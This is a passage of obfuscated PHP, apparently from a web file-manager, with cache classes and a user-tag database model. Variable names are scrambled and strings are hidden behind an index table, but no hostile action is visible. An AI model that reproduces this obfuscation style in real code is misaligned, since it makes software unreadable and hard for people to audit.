$ÙÉ¯åÓâ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($€ïû©ú) { if (is_array($€ïû©ú) || is_object($€ïû©ú)) { $€ïû©ú = json_encode($€ïû©ú); } $€ïû©ú = rawurlencode($€ïû©ú); return md5(KOD_SITE_ID . $_SERVER[É¨™èà][11] . $€ïû©ú); } public static function get($ë¸ôÉÄ, $¸°À‡í“ = false) { $Ä‘†åÈ = self::key($ë¸ôÉÄ); $õ¨Ü¬œ = self::init(); if ($¸°À‡í“) { return unserialize($õ¨Ü¬œ->get($Ä‘†åÈ)); } if (!isset(self::$memoryCache[$Ä‘†åÈ])) { $°àş¾ùË = $õ¨Ü¬œ->get($Ä‘†åÈ); self::$memoryCache[$Ä‘†åÈ] = unserialize($°àş¾ùË); } return self::$memoryCache[$Ä‘†åÈ]; } public static function set($ç•²×¯›, $ğïÃüçğ, $–‡ÏÁÂ = false) { $ôêÛ’¬¯ =& $_SERVER[É¨™èà]; $‰€ä« = self::key($ç•²×¯›); if (isset(self::$memoryCache[$‰€ä«]) && self::$memoryCache[$‰€ä«] === $ğïÃüçğ) { return !0; } if ($–‡ÏÁÂ === 0) { self::$memoryCache[$‰€ä«] = $ğïÃüçğ; return !0; } $òº¢ú·Í = self::init(); $Ê„ƒéš = serialize($ğïÃüçğ); CacheLock::lock($ç•²×¯› . $ôêÛ’¬¯[928]); $—™ˆ”çŞ = $òº¢ú·Í->set($‰€ä«, $Ê„ƒéš, $–‡ÏÁÂ); self::$memoryCache[$‰€ä«] = $ğïÃüçğ; CacheLock::unlock($ç•²×¯› . $ôêÛ’¬¯[928]); return $—™ˆ”çŞ; } public static function getCall($ôéë“è», $¨š½ÌÂÁ, $ıØŠŸíã, $Áå“Îç· = array()) { $ÉáÃøäÀ =& $_SERVER[É¨™èà]; $Ïùí¬š = self::get($ôéë“è»); if ($Ïùí¬š || $Ïùí¬š === $ÉáÃøäÀ[12]) { return $Ïùí¬š; } $Ïùí¬š = call_user_func_array($ıØŠŸíã, $Áå“Îç·); $Ïùí¬š = $Ïùí¬š ? $Ïùí¬š : $ÉáÃøäÀ[12]; self::set($ôéë“è», $Ïùí¬š, $¨š½ÌÂÁ); return $Ïùí¬š; } public static function remove($“ù±èé“) { $€Å¦…ŒÚ = self::key($“ù±èé“); unset(self::$memoryCache[$€Å¦…ŒÚ]); self::clearTimeout(); CacheLock::lock($“ù±èé“); $ ©İúş = self::init()->remove($€Å¦…ŒÚ); CacheLock::unlock($“ù±èé“); return $ ©İúş; } public static function removeMemory($£ìÁ³) { $ÄÃô¾¨” = self::key($£ìÁ³); unset(self::$memoryCache[$ÄÃô¾¨”]); } public static function clearMemory($“¹Ôüüñ = false) { if ($“¹Ôüüñ) { $“¹Ôüüñ = self::key($“¹Ôüüñ); unset(self::$memoryCache[$“¹Ôüüñ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[É¨™èà][929])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[É¨™èà][930])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ì±²®„À, $ßËÆˆÖ¥) { $‘ØöæÉ… =& $_SERVER[É¨™èà]; $this->cachePath = $Ì±²®„À[$‘ØöæÉ…[87]]; $this->prefix = $‘ØöæÉ…[931]; $this->cacheTime = $ßËÆˆÖ¥; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($˜Õïƒ¾ã) { $Î×±Ëİä =& $_SERVER[É¨™èà]; $˜Õïƒ¾ã = str_replace(array($Î×±Ëİä[932], $Î×±Ëİä[100], $Î×±Ëİä[76]), $Î×±Ëİä[933], $˜Õïƒ¾ã); return $this->cachePath . $Î×±Ëİä[934] . $˜Õïƒ¾ã . $Î×±Ëİä[935]; } public function set($§ˆÉĞö, $ŞÑŒËÁ•, $Ò¹ïî×â = false) { $Ò¹ïî×â = $Ò¹ïî×â ? $Ò¹ïî×â : $this->cacheTime; $é¹ĞÄùú = $this->getFile($§ˆÉĞö); if (file_put_contents($é¹ĞÄùú, $this->prefix . $ŞÑŒËÁ•, LOCK_EX)) { @touch($é¹ĞÄùú, intval(time() + $Ò¹ïî×â)); clearstatcache(); return !0; } @unlink($é¹ĞÄùú); return !1; } public function get($„ôéÙ‰Ä) { $ÇúìÓÉ¡ = $this->getFile($„ôéÙ‰Ä); if (file_exists($ÇúìÓÉ¡) && filemtime($ÇúìÓÉ¡) < time()) { @unlink($ÇúìÓÉ¡); return !1; } $Æ“¿ = @file_get_contents($ÇúìÓÉ¡); return substr($Æ“¿, strlen($this->prefix)); } public function remove($ğêÇ™Ì) { $ßó­ã¨ß = $this->getFile($ğêÇ™Ì); return @unlink($ßó­ã¨ß); } public function deleteAll() { $¦ ìôÒ =& $_SERVER[É¨™èà]; $‰ô®íê¹ = scandir($this->cachePath); foreach ($‰ô®íê¹ as $àÖ¾½¸) { $Ë…îÜøœ = $this->cachePath . $àÖ¾½¸; if (strpos($Ë…îÜøœ, $¦ ìôÒ[935]) && strpos($Ë…îÜøœ, $¦ ìôÒ[936])) { @unlink($Ë…îÜøœ); } } } public function clearTimeout() { $ŞØ¡¹áş =& $_SERVER[É¨™èà]; $ëª£Øş‹ = scandir($this->cachePath); foreach ($ëª£Øş‹ as $ÍÜÒ‰Ó) { $‡İÔĞÜŞ = $this->cachePath . $ÍÜÒ‰Ó; if (strpos($‡İÔĞÜŞ, $ŞØ¡¹áş[935]) && strpos($‡İÔĞÜŞ, $ŞØ¡¹áş[936]) && filemtime($‡İÔĞÜŞ) < time()) { @unlink($‡İÔĞÜŞ); } } } } goto D¡ÔÁ†ÉÙÄ; cÍ‹ïâø×: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($ÉıÏõ­˜) { $®ûö‘Ç˜ =& $_SERVER[É¨™èà]; return array($®ûö‘Ç˜[2115] => array($®ûö‘Ç˜[2551] . USER_ID, $®ûö‘Ç˜[2116])); } protected function listData() { $ÖÄ™šñæ =& $_SERVER[É¨™èà]; $ñ‰Ô“öÆ = array($ÖÄ™šñæ[1791] => USER_ID, $ÖÄ™šñæ[569] => array($ÖÄ™šñæ[2119], 0)); $èşóŠóˆ = $ÖÄ™šñæ[2552]; $Œİ±íáŒ = $this->field($èşóŠóˆ)->where($ñ‰Ô“öÆ)->order($ÖÄ™šñæ[2121])->select(); return $Œİ±íáŒ ? $Œİ±íáŒ : array(); } protected function addToTag($éÂîŠäÊ, $åÃèÙµÓ) { $‡˜óåÚÜ =& $_SERVER[É¨™èà]; if (!Model($‡˜óåÚÜ[2272])->listData($åÃèÙµÓ)) { return !1; } if (is_numeric($éÂîŠäÊ)) { $ù„ïÈ“ğ = Model($‡˜óåÚÜ[921])->pathInfo($éÂîŠäÊ); if (!$ù„ïÈ“ğ) { return !1; } } else { $ù„ïÈ“ğ = IO::infoSimple($éÂîŠäÊ); if (!$ù„ïÈ“ğ) { return !1; } $âõ—ïğÛ = $ù„ïÈ“ğ[$‡˜óåÚÜ[32]]; $ˆâ¸¡Ï¾ = $ù„ïÈ“ğ[$‡˜óåÚÜ[33]]; if (isset($ù„ïÈ“ğ[$‡˜óåÚÜ[495]])) { $ˆâ¸¡Ï¾ = $ù„ïÈ“ğ[$‡˜óåÚÜ[495]] == $‡˜óåÚÜ[91] ? $‡˜óåÚÜ[78] : $‡˜óåÚÜ[233]; } } $ìºË‹Åô = array($‡˜óåÚÜ[1791] => USER_ID, $‡˜óåÚÜ[569] => $åÃèÙµÓ, $‡˜óåÚÜ[505] => $éÂîŠäÊ, $‡˜óåÚÜ[506] => $ˆâ¸¡Ï¾ ? $ˆâ¸¡Ï¾ : $‡˜óåÚÜ[500], $‡˜óåÚÜ[504] => $âõ—ïğÛ ? $âõ—ïğÛ : $‡˜óåÚÜ[12], $‡˜óåÚÜ[2003] => 0); if ($this->where($ìºË‹Åô)->find()) { return !1; } return $this->add($ìºË‹Åô); } protected function removeFromTag($Ñ½Äµ‡ë, $¿‰óû‚ë) { $›Á»’ÃÌ =& $_SERVER[É¨™èà]; if (!Model($›Á»’ÃÌ[2272])->listData($¿‰óû‚ë)) { return !1; } if (is_array($Ñ½Äµ‡ë)) { $Ñ½Äµ‡ë = array($›Á»’ÃÌ[7], $Ñ½Äµ‡ë); } $ƒ©èéúğ = array($›Á»’ÃÌ[1791] => USER_ID, $›Á»’ÃÌ[569] => $¿‰óû‚ë, $›Á»’ÃÌ[505] => $Ñ½Äµ‡ë); return $this->where($ƒ©èéúğ)->delete(); } protected function removeByTag($³±ìÀúï) { $ìşƒ÷’Ä =& $_SERVER[É¨™èà]; if (!$³±ìÀúï) { return !1; } $¸Â”è­ = array($ìşƒ÷’Ä[1791] => USER_ID, $ìşƒ÷’Ä[569] => $³±ìÀúï); return $this->where($¸Â”è­)->delete(); } protected function removeBySource($ş¯š‰œÓ) { $’ Ìı¨ª =& $_SERVER[É¨™èà]; if (is_array($ş¯š‰œÓ)) { $ş¯š‰œÓ = array($’ Ìı¨ª[7], $ş¯š‰œÓ); } $î¦À†°õ = array($’ Ìı¨ª[1791] => USER_ID, $’ Ìı¨ª[569] => array($’ Ìı¨ª[1108], 0), $’ Ìı¨ª[505] => $ş¯š‰œÓ); return $this->where($î¦À†°õ)->delete(); } }